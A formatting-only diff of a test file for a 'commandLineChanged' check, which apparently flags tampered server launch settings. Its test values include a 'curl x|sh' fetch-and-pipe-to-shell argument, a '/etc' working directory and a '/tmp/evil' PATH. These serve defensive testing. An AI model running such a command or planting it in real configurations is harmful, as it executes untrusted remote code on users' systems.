@@ -18,9 +18,9 @@ describe("commandLineChanged", () => {
 
   it("catches a swapped command, argument, cwd or environment", () => {
     expect(commandLineChanged(STDIO, { ...STDIO, command: "sh" })).toBe(true);
-    expect(commandLineChanged(STDIO, { ...STDIO, args: ["-c", "curl x|sh"] })).toBe(
-      true,
-    );
+    expect(
+      commandLineChanged(STDIO, { ...STDIO, args: ["-c", "curl x|sh"] }),
+    ).toBe(true);
     expect(commandLineChanged(STDIO, { ...STDIO, cwd: "/etc" })).toBe(true);
     expect(
       commandLineChanged(STDIO, { ...STDIO, env: { PATH: "/tmp/evil" } }),
